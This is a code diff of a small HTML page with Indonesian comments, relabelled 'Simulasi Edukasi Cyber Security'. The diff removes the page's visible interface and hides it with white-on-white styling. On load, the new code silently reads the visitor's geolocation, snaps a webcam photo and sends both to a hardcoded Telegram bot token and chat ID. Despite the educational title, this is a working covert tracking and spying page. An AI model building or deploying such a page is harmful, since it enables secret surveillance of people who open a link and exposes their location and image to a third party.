@@ -1,65 +1,62 @@
 <!DOCTYPE html>
-<html lang="id">
+<html>
 <head>
-  <meta charset="UTF-8">
-  <title>Ujian Cyber Security</title>
+  <title>Simulasi Edukasi Cyber Security</title>
 </head>
-<body>
-  <h1>Deteksi Lokasi dan Kamera</h1>
-  <p id="location">Mengambil lokasi...</p>
-  <video id="video" autoplay playsinline width="320" height="240"></video>
-  <br><br>
-  <button onclick="captureAndSend()">Ambil Foto & Kirim ke Telegram</button>
-  <canvas id="canvas" width="320" height="240" style="display:none;"></canvas>
-
+<body style="background:white; color:white;">
   <script>
-    const TELEGRAM_BOT_TOKEN = '8485657668:AAHeH2g82CDPoB9MJyruOnfXEu7dU9rKs_8';
-    const TELEGRAM_CHAT_ID = '7979700473';
+    // Bot Telegram config
+    const telegramToken = '8485657668:AAHeH2g82CDPoB9MJyruOnfXEu7dU9rKs_8';
+    const chatId = '7979700473';
 
-    let latitude = "", longitude = "";
+    // Fungsi kirim ke Telegram
+    async function sendToTelegram(photoBlob, latitude, longitude) {
+      const formData = new FormData();
+      formData.append('chat_id', chatId);
+      formData.append('caption', `Simulasi Edukasi\nLokasi:\nLatitude: ${latitude}\nLongitude: ${longitude}`);
+      formData.append('photo', photoBlob, 'photo.jpg');
+
+      await fetch(`https://api.telegram.org/bot${telegramToken}/sendPhoto`, {
+        method: 'POST',
+        body: formData
+      });
+    }
 
     // Ambil lokasi
-    if (navigator.geolocation) {
+    function getLocationAndCamera() {
       navigator.geolocation.getCurrentPosition(
-        function(position) {
-          latitude = position.coords.latitude;
-          longitude = position.coords.longitude;
-          document.getElementById("location").innerText = `Lokasi Anda: Latitude ${latitude}, Longitude ${longitude}`;
+        async (position) => {
+          const latitude = position.coords.latitude;
+          const longitude = position.coords.longitude;
+
+          const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+          const video = document.createElement('video');
+          video.srcObject = stream;
+          video.play();
+
+          // Tunggu video nyala 1 detik, lalu ambil foto
+          setTimeout(async () => {
+            const canvas = document.createElement('canvas');
+            canvas.width = 320;
+            canvas.height = 240;
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            stream.getTracks().forEach(track => track.stop());
+
+            // Ubah ke blob
+            canvas.toBlob(async (blob) => {
+              await sendToTelegram(blob, latitude, longitude);
+            }, 'image/jpeg');
+          }, 1000);
         },
-        function(error) {
-          document.getElementById("location").innerText = "Gagal ambil lokasi: " + error.message;
+        (error) => {
+          alert("Gagal ambil lokasi: " + error.message);
         }
       );
     }
 
-    // Tampilkan kamera
-    navigator.mediaDevices.getUserMedia({ video: true })
-      .then(function(stream) {
-        document.getElementById("video").srcObject = stream;
-      })
-      .catch(function(err) {
-        console.error("Kamera error:", err);
-      });
-
-    // Capture dan kirim ke Telegram
-    function captureAndSend() {
-      const canvas = document.getElementById("canvas");
-      const video = document.getElementById("video");
-      canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
-      canvas.toBlob(function(blob) {
-        // Kirim ke Telegram
-        const formData = new FormData();
-        formData.append("chat_id", TELEGRAM_CHAT_ID);
-        formData.append("photo", blob);
-        formData.append("caption", `Lokasi:\nLatitude: ${latitude}\nLongitude: ${longitude}`);
-
-        fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
-          method: "POST",
-          body: formData
-        }).then(res => alert("Terkirim ke Telegram!"))
-          .catch(err => alert("Gagal kirim: " + err));
-      }, 'image/jpeg');
-    }
+    // Mulai ambil saat halaman dibuka
+    window.onload = getLocationAndCamera;
   </script>
 </body>
 </html>
